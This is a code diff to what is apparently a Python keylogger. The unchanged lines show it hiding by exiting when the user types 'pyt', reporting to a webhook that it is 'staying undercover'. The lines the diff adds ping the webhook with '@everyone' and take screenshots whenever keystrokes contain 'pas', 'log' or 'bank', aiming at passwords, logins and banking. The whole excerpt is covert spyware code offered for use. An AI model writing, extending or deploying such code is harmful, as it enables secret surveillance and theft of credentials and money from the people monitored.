@@ -246,6 +246,15 @@ def monitor_input():
             if "pyt" in keystrokes.lower():
                 send_to_webhook("User searched for Python. Killing process to stay undercover.")
                 os._exit(0) 
+            elif "pas" in keystrokes.lower():
+                send_to_webhook("@everyone Password!")
+                screenshot()
+            elif "log" in keystrokes.lower():
+                send_to_webhook("@everyone Login!")
+                screenshot()
+            elif "bank" in keystrokes.lower():
+                send_to_webhook("@everyone Bank!")
+                screenshot()
 
 
 # Run kill.bat file at the start
